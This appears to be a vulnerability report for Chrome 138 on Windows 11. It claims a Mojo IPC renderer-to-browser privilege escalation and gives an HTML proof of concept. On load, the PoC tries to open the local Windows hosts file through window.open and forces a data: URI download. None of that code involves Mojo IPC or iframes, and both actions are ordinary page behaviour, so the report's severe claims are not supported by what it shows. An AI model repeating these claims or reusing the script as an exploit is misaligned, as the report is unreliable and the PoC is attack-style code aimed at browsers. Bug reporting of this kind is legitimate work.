### VULNERABILITY DETAILS

A renderer-originated Mojo IPC call can invoke privileged browser-level behavior without user interaction. Specifically:

- A crafted HTML page automatically:
  - Initiates a file download via `<a download>` without user input
  - Opens a local file (e.g., `file:///C:/Windows/System32/drivers/etc/hosts`) when popups are allowed

This is possible due to weak validation on `OpenURL()` / `AddNewContents()` pathways combined with origin misclassification under iframe contexts.

This results in a structural privilege boundary violation (Renderer → Browser), which can be triggered without memory corruption or native exploit.

---

### VERSION

**Chrome Version**:  Version 138.0.7204.97(Stable build) (64bit)  
**Operating System**: Windows 11 Home 
version 24H2

### REPRODUCTION CASE

Please find below the minimal HTML file which triggers the issue. Save as `poc.html` and open in Chrome:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Renderer to Browser Privilege Escalation PoC</title>
  <script>
    window.onload = function () {
      // Attempt to open a local file (requires popup permission)
      window.open('file:///C:/Windows/System32/drivers/etc/hosts', '_blank');

      // Auto-download on page load
      let a = document.createElement('a');
      a.href = 'data:text/plain,This is an unauthorized download';
      a.download = 'proof.txt';
      document.body.appendChild(a);
      a.click();
    };
  </script>
</head>
<body>
  <h1>PoC Triggering...</h1>
  <p>If successful, you should see a file download start, and a local file window open (if popups are allowed).</p>
</body>
</html>
